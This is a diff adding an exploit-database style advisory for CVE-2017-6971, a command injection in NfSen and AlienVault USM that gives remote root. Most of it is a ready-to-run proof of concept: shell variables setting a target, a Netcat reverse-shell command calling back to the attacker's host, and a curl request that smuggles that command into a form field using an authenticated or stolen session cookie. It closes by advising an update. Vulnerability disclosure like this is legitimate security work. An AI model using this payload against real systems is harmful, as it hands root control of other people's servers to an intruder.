@@ -1,0 +1,33 @@
+# Exploit Title: NfSen/AlienVault remote root exploit (IPC query command injection)
+# Version: NfSen 1.3.6p1, 1.3.7 and 1.3.7-1~bpo80+1_all. Previous versions are also likely to be affected.
+# Version: AlienVault 5.3.4
+# Date: 2017-07-10
+# Vendor Homepage: http://nfsen.sourceforge.net/
+# Vendor Homepage: http://www.alienvault.com/
+# Software Link: https://sourceforge.net/projects/nfsen/files/stable/nfsen-1.3.7/nfsen-1.3.7.tar.gz/download
+# Exploit Author: Paul Taylor / Foregenix Ltd
+# Website: http://www.foregenix.com/blog
+# Tested on: AlienVault USM 5.3.4
+# CVE: CVE-2017-6971
+1. Description
+
+A remote authenticated attacker (or an attacker with a stolen PHP Session ID) can gain complete control over the system by sending a crafted request containing control characters and shell commands which will be executed as root on a vulnerable system.
+
+2. Proof of Concept
+# From a linux bash prompt on the attacker's machine:
+
+# Set target IP
+targetip='10.100.1.1'
+
+# Set desired command to inject (in this case a reverse shell, using Netcat which is conveniently available on an AlienVault USM All-In-One):
+cmd='nc -ne /bin/bash 10.100.1.2 443';
+
+# Set the PHPSESSID of an authenticated session which has *already* submitted at least one valid NfSen query for processing via the Web UI.
+PHPSESSID='offq09ckq66fqtvdd0vsuhk5c7';
+
+# Next use curl to send the exploit
+curl -o /dev/null -s -k -b "PHPSESSID=$PHPSESSID" -d "process=Process&output=custom+...&customfmt=%0A.%0Arun-nfdump%0Aargs=-h; $cmd #" https://$targetip/ossim/nfsen/nfsen.php
+
+3. Solution:
+
+Update to latest version of NfSen/USM/OSSIM
